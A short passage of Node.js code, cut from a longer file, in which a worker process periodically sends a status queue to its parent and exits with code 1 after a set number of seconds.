        process.send(statusesQ)
    }, 950)

    setTimeout(() => process.exit(1), time * 1000);
}